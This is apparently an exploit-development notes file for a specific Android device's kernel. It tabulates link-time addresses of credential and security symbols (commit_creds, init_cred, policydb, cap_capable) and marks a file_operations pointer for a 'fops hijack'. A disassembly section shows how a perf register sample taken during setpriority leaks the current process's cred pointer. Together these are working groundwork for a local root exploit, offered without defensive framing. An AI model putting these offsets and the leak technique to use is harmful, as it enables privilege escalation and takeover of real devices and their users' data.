# MRX-W09 kernel symbol ground truth (from the device's own image)

Extracted 2026-09-26 from the actual device kernel image (NOT a guess, NOT a
different device's vmlinux):

- Image: `[FIRMWARE]\MRX-W09\extracted\vmlinux.elf` (61,492,931 bytes)
- `llvm-nm.exe -n` / `aarch64-linux-android-objdump.exe` from
  `[WORKSPACE]\android-ndk-r20b\toolchains\llvm\prebuilt\windows-x86_64\bin\`

All addresses are **link-time**; add `g_slide` when used on a running device.

| Symbol | Link address | Note |
|---|---|---|
| `init_task` | `0xffffff800adeb4c0` | |
| `init_cred` | `0xffffff800adfcd28` | |
| `commit_creds` | `0xffffff8009e6212c` | n-symbol (trampoline to `.cfi`) |
| `security_capable` | `0xffffff8009e621c4` | n-symbol |
| `cap_capable` | `0xffffff8009e62278` | n-symbol |
| `policydb` | `0xffffff800b3b97c0` | `b` symbol |
| `ashmem_misc` | `0xffffff800b118898` | `struct miscdevice`; **`.fops` = +0x10 = `0xffffff800b1188a8`** |
| `ashmem_fops` | `0xffffff8009fee678` | real `file_operations` table (.rodata) |
| `ashmem_open` | `0xffffff8009e8b5d0` | |
| `ashmem_ioctl` | `0xffffff8009e7e454` | |
| `ashmem_mmap` | `0xffffff8009e7e690` | |
| `ashmem_release` | `0xffffff8009e8b5d4` | |
| `noop_llseek` | `0xffffff8009e7ba6c` | |
| `configfs_read_file` | `0xffffff8009e89ae4` | |
| `configfs_read_bin_file` | `0xffffff8009e89ae8` | legacy `.read` for the fops hijack |
| `configfs_write_file` | `0xffffff8009e8ac88` | |
| `configfs_write_bin_file` | `0xffffff8009e8ac8c` | |
| `SyS_setpriority` | `0xffffff8009e7fcd8` | **syscall trampoline**: `b SyS_setpriority.cfi` |
| `SyS_setpriority.cfi` | `0xffffff800818e354` | the real body perf samples |
| `SyS_setresuid.cfi` | `0xffffff800818fd1c` | from the trampoline table |
| `SyS_getresuid.cfi` | `0xffffff8008190090` | |
| `SyS_pselect6.cfi` | `0xffffff800846d774` | the pselect6 carrier |

## `SyS_setpriority.cfi` disassembly (cred leak anchor)

```
ffffff800818e354 <SyS_setpriority.cfi>:
+0x00 d101c3ff  sub  sp, sp, #0x70
...
+0x34 d5384113  mrs  x19, sp_el0            ; x19 = current
+0x38 b946c268  ldr  w8,  [x19,#1728]
+0x3c f944f679  ldr  x25, [x19,#2536]       ; x25 = current->cred  (2536 = 0x9E8)
...
+0x11c f9404320 ldr  x0,  [x25,#128]        ; cred->user (0x80)  - x25 still cred
+0x1d4 f944f669 ldr  x9,  [x19,#2536]       ; cred reloaded into x9
+0x210 f944f677 ldr  x23, [x19,#2536]       ; cred reloaded into x23
+0x1f8 d000e999 adrp x25, ...               ; x25 REUSED here
```

=> **x25 == `current->cred` for the whole IP window
`[0xffffff800818e354+0x3c, 0xffffff800818e354+0x1f8)` (0x1BC bytes)**, reached by
ANY `setpriority(0,0,-20)`.  perf reg index 25 = `PERF_REG_ARM64_X25` (verified in
`arch/arm64/include/uapi/asm/perf_regs.h`), `regs->regs[25]` in
`arch/arm64/kernel/perf_regs.c`.
